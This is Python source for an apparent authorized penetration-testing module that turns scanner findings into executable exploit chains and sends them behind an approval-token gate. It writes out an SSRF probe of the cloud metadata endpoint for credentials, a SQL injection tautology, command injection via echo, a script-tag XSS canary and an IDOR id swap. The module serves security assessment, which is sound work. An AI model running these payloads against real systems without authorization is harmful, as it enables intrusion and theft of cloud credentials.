"""
chainexec.py — auto-exploit chain builder + operator-gated execution.

AUTHORIZED TESTING ONLY. Takes vulnscan2.F()-shaped findings and builds
EXECUTABLE chain plans (concrete request specs, expected proofs) that pair
findings into attack sequences:

    SSRF   -> internal/metadata fetch (decoded secret/marker proof)
    SQLi   -> guided dump marker proof
    CMDi   -> echo proof of a benign marker
    IDOR   -> access a resource belonging to another user (uid proof)
    XSS    -> canary reflection proof

build_chains(findings) is a PURE function: no network, never raises.
execute_chain(plan, ctx) is FAIL-CLOSED operator-gated execution:
  - refuses unless ctx carries an explicit non-empty approve token
    (ctx.approve_token or ctx.opts['approve_token']);
  - never runs more than MAX_STEPS (6) steps;
  - respects ctx.cancelled() between steps;
  - a failing/failed step aborts the chain cleanly (no further requests).

CONFIRMED chain = every step produced its expected proof
(verification 'executed-proof'); a partial run is reported as a
candidate with a note naming the step that failed.
"""
import re
import urllib.parse

try:
    import netclient
except ImportError:  # allow standalone import (build_chains is pure)
    netclient = None

MAX_STEPS = 6
MAX_CHAINS = 20

SEV_WEIGHTS = {"CRITICAL": 45, "HIGH": 35, "MEDIUM": 25, "LOW": 15, "INFO": 5}

# expected-proof markers (benign, clearly-labeled canary strings)
DUMP_MARKER = "PTKDUMPMARKER7f3a"
CMD_PROOF = "PTKCMDPROOF9c2e"
XSS_CANARY = "PTKXSSCANARY4b1d"
SECRET_PREFIX = "PTKSECRET"

_META_HOST = "169.254.169.254"

# ------------------------------------------------------------- classification

_TYPE_PATTERNS = [
    ("cmdi", re.compile(r"command injection|cmd\s*injection|\brce\b|"
                        r"remote code execution|os command", re.I)),
    ("sqli", re.compile(r"sql\s*injection|\bsqli\b|orm injection|"
                        r"blind sql|union\s*select|schema enumeration", re.I)),
    ("ssrf", re.compile(r"\bssrf\b|server[- ]side request|"
                        r"metadata endpoint|cloud metadata|internal service", re.I)),
    ("idor", re.compile(r"\bidor\b|\bbola\b|broken (object|access)|"
                        r"cross[- ]user|authorization", re.I)),
    ("xss", re.compile(r"\bxss\b|cross[- ]site scripting|script injection|"
                       r"reflected|stored xss", re.I)),
]


def classify(f):
    """Attack-chain type for a finding dict ('ssrf'/'sqli'/'cmdi'/'idor'/'xss')."""
    if not isinstance(f, dict):
        return None
    text = f"{f.get('title', '')} {f.get('description', '')} {f.get('evidence', '')}"
    for ttype, pat in _TYPE_PATTERNS:
        if pat.search(text):
            return ttype
    return None


def _sev(f):
    return str(f.get("severity", "INFO")).upper()


def _impact(f, ttype):
    """Estimated impact 0-100: severity weight + terminal-reach bonus."""
    base = SEV_WEIGHTS.get(_sev(f), 10)
    bonus = {"cmdi": 45, "sqli": 40, "ssrf": 30, "idor": 30, "xss": 20}.get(ttype, 10)
    return min(100, base + bonus)


# ---------------------------------------------------------------- plan helpers

def _first_param(f):
    p = str(f.get("param", "") or "")
    if p:
        return p
    loc = str(f.get("location", "") or "")
    m = re.search(r"[?&]([A-Za-z_][A-Za-z0-9_]{1,30})=", loc)
    return m.group(1) if m else "url"


def _path_of(f):
    loc = str(f.get("location", "") or "")
    if not loc:
        return "/"
    return loc if loc.startswith("/") else "/" + loc.lstrip("/")


def _step(method, url, expected, headers=None, body=None, desc="", final=False):
    return {
        "method": method.upper(),
        "url": url,
        "headers": dict(headers or {}),
        "body": body,
        "expected": expected,       # regex string matched against response body
        "desc": desc,
        "final": bool(final),
    }


def _idn_step(f, ttype):
    """Final-step proof spec for a chain of the given type."""
    if ttype == "ssrf":
        return SECRET_PREFIX
    if ttype == "sqli":
        return DUMP_MARKER
    if ttype == "cmdi":
        return CMD_PROOF
    if ttype == "idor":
        m = re.search(r"uid[:\s]*([A-Za-z0-9_\-@.]{2,40})", str(f.get("evidence", "")))
        return m.group(1) if m else "admin"
    if ttype == "xss":
        return XSS_CANARY
    return "PROOF"


def _build_for(f, ttype):
    """One executable chain plan for a single finding (may be 1-2 steps)."""
    path = _path_of(f)
    param = _first_param(f)
    headers = {}
    fhdr = f.get("headers") if isinstance(f.get("headers"), dict) else None
    if fhdr:
        headers.update({str(k): str(v) for k, v in fhdr.items()})
    proof = _idn_step(f, ttype)

    if ttype == "ssrf":
        # point the SSRF-able parameter at an internal endpoint; a decoded
        # instance token / secret is the proof. For findings that mention
        # cloud metadata, a second step targets the IMDS endpoint.
        internal = f"{path}?{param}=/chain/secret" if path.endswith("ssrf") \
            else f"{path}?{param}=/internal/secret"
        steps = [_step("GET", internal, SECRET_PREFIX + r"[0-9a-f]{6,}", headers=headers,
                       desc=f"Fetch an internal secret through the SSRF "
                            f"parameter '{param}' ({path})",
                       final=True)]
        if re.search(r"metadata|cloud|imds", str(f.get("description", "")) +
                     str(f.get("evidence", "")), re.I):
            meta_url = f"http://{_META_HOST}/latest/meta-data/"
            steps.append(_step(
                "GET", f"{path}?{param}={urllib.parse.quote(meta_url, safe='')}",
                r"ami-|instance-id|iam|security-credentials|" + SECRET_PREFIX,
                headers=headers,
                desc="Fetch cloud instance metadata (IMDS) through the same "
                     "SSRF parameter",
                final=True))
        name = "SSRF -> Internal/Metadata Fetch"

    elif ttype == "sqli":
        inj = f"' OR '1'='1" if param else "' OR '1'='1"
        q = f"{path}?{param}={urllib.parse.quote(inj)}"
        steps = [_step("GET", q, DUMP_MARKER, headers=headers,
                       desc=f"Extract data through SQLi in parameter '{param}' "
                            f"({path}); proof is the dump marker",
                       final=True)]
        name = "SQLi -> Guided Dump Marker"

    elif ttype == "cmdi":
        inj = f"echo {CMD_PROOF}"
        q = f"{path}?{param}={urllib.parse.quote(inj)}"
        steps = [_step("GET", q, CMD_PROOF, headers=headers,
                       desc=f"Prove command execution in parameter '{param}' "
                            f"({path}) with a benign echo marker",
                       final=True)]
        name = "CMDi -> Echo Proof"

    elif ttype == "idor":
        # swap the object id for another user's; uid in evidence is the proof
        other = re.search(r"(id[=/])(\d{1,10})", path)
        if other:
            nxt = str(int(other.group(2)) + 1)
            target = path[:other.start(2)] + nxt + path[other.end(2):]
        else:
            target = path + ("/" if not path.endswith("/") else "") + "1"
        steps = [_step("GET", target, proof, headers=headers,
                       desc=f"Access another user's object via IDOR at "
                            f"{target}; proof is the other user's identifier",
                       final=True)]
        name = "IDOR -> Cross-User Object Access"

    elif ttype == "xss":
        canary = f"<script>{XSS_CANARY}</script>"
        q = f"{path}?{param}={urllib.parse.quote(canary, safe='')}"
        steps = [_step("GET", q, XSS_CANARY, headers=headers,
                       desc=f"Reflect the canary through the XSS sink "
                            f"'{param}' ({path})",
                       final=True)]
        name = "XSS -> Canary Reflection"

    else:
        return None

    return name, steps


# ------------------------------------------------------------------ public API

def build_chains(findings):
    """Pair/classify findings into executable chain plans (pure, never raises).

    Returns a list of plans:
      {"name", "type", "severity", "steps": [step...], "expected_proof",
       "safety_class", "impact", "source_findings", "note"}
    Steps are concrete request specs (method/url/headers/body + expected
    proof regex). Chains are capped at MAX_STEPS and MAX_CHAINS entries.
    """
    plans = []
    try:
        for f in (findings or []):
            if len(plans) >= MAX_CHAINS:
                break
            ttype = classify(f)
            if not ttype:
                continue
            built = _build_for(f, ttype)
            if not built:
                continue
            name, steps = built
            if not steps or len(steps) > MAX_STEPS:
                continue
            plans.append({
                "name": name,
                "type": ttype,
                "severity": _sev(f),
                "steps": steps,
                "expected_proof": steps[-1]["expected"],
                "safety_class": "active" if ttype in ("sqli", "cmdi") else "safe",
                "impact": _impact(f, ttype),
                "source_findings": [str(f.get("title", "?"))],
                "note": ("requires an explicit approve token before execution; "
                         f"safety_class={ 'active (server-side execution) ' if ttype in ('sqli', 'cmdi') else 'read-only probes'}"
                         .strip()),
            })
        plans.sort(key=lambda p: -p["impact"])
    except Exception:
        pass
    return plans


def _approve_token(ctx):
    tok = getattr(ctx, "approve_token", None)
    if tok:
        return str(tok)
    opts = getattr(ctx, "opts", None) or {}
    tok = opts.get("approve_token")
    return str(tok) if tok else None


def _request_of(ctx, step):
    """Perform one step request; returns netclient.Resp or raises."""
    c = ctx.client
    headers = step.get("headers") or {}
    return c.request(step["method"], step["url"], data=step.get("body"),
                     headers=headers)


def execute_chain(plan, ctx):
    """Run a chain plan against the target — FAIL-CLOSED, operator-gated.

    Refuses (returns {'status': 'refused', ...}) unless ctx carries an
    explicit non-empty approve token (ctx.approve_token or
    ctx.opts['approve_token']). Honors ctx.cancelled() between steps.
    Runs at most MAX_STEPS steps. A step whose request errors or whose
    expected proof does not match aborts the chain immediately.

    Returns:
      {"chain", "status": "confirmed"|"partial"|"refused"|"cancelled",
       "verification": "executed-proof"|"candidate"|"refused",
       "evidence": [{step_index, desc, request, status, proof, verification}...],
       "steps_run", "failed_step", "note", "impact"}
    CONFIRMED = every step matched its expected proof (verification
    'executed-proof'). Any earlier failure leaves a candidate with a note
    naming the step that failed.
    """
    out = {"chain": (plan or {}).get("name", "?"),
           "status": "refused", "verification": "refused",
           "evidence": [], "steps_run": 0, "failed_step": None,
           "note": "", "impact": (plan or {}).get("impact", 0)}
    if not isinstance(plan, dict) or not (plan.get("steps") or []):
        out["note"] = "empty plan"
        return out
    token = _approve_token(ctx)
    if not token:
        out["note"] = ("execution refused: no explicit approve token on ctx "
                       "(fail-closed; set ctx.approve_token or "
                       "ctx.opts['approve_token'])")
        return out
    steps = plan["steps"][:MAX_STEPS]
    cancelled = getattr(ctx, "cancelled", None)
    for i, step in enumerate(steps):
        if callable(cancelled):
            try:
                if cancelled():
                    out["status"] = "cancelled"
                    out["verification"] = "candidate"
                    out["failed_step"] = i
                    out["note"] = (f"cancelled before step {i + 1}; chain is "
                                   "a candidate")
                    return out
            except Exception:
                pass
        req = f"{step['method']} {step['url']}"
        if step.get("body"):
            req += f" body={str(step['body'])[:120]}"
        try:
            r = _request_of(ctx, step)
        except Exception as e:
            out["failed_step"] = i
            out["status"] = "partial"
            out["verification"] = "candidate"
            out["note"] = (f"step {i + 1} failed mid-chain and the chain "
                           f"aborted: {e}")
            return out
        out["steps_run"] += 1
        body = (getattr(r, "body", "") or "")
        status = getattr(r, "status", 0)
        pat = step.get("expected") or ""
        m = re.search(pat, body)
        ok = bool(m) and status == 200
        entry = {
            "step_index": i,
            "desc": step.get("desc", ""),
            "request": req,
            "status": status,
            "proof": m.group(0) if m else None,
            "verification": "executed-proof" if ok else "no-proof",
        }
        out["evidence"].append(entry)
        if not ok:
            out["failed_step"] = i
            out["status"] = "partial"
            out["verification"] = "candidate"
            out["note"] = (f"step {i + 1} did not produce its expected proof "
                           f"(HTTP {status}, proof pattern {pat!r} not found); "
                           "chain aborted, reported as candidate")
            return out
    out["status"] = "confirmed"
    out["verification"] = "executed-proof"
    out["note"] = (f"all {len(steps)} steps produced their expected proof")
    return out


def summarize(results):
    """Human-readable English summary for reports."""
    if not results:
        return "No exploit chains were executed."
    lines = ["Exploit chain execution results (operator-gated):"]
    for r in results:
        lines.append(f"- {r.get('chain', '?')} [{r.get('status', '?')} / "
                     f"{r.get('verification', '?')}] steps={r.get('steps_run')}")
        if r.get("note"):
            lines.append(f"    note: {r['note']}")
        for e in (r.get("evidence") or []):
            proof = e.get("proof")
            lines.append(f"    step {e['step_index'] + 1}: "
                         f"{e.get('verification')} "
                         f"(proof: {proof if proof else 'none'})")
    return "\n".join(lines)
